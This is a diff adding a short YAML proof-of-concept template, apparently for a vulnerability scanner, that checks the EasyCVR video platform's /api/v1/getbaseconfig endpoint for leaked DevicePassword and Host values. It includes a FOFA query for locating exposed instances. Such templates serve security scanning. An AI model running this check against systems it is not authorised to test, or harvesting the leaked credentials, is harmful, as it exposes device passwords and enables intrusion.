@@ -1,0 +1,16 @@
+id: poc-yaml-easy-cvr-getbaseconfig-info-leak
+info:
+  name: EasyCVR视频管理平台 getbaseconfig 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: EasyCVR
+  fofa: title="EasyCVR"
+requests:
+- method: GET
+  path: /api/v1/getbaseconfig
+  expression: status_code == 200 && contains(content_type,"application/json") && !contains(body,"<")
+    && matches(body,"\"DevicePassword\"\x3a \"[0-9a-zA-Z]+\"") && matches(body,"\"Host\"\x3a
+    \"[0-9.]+\"")
+variables: {}
+transport: http
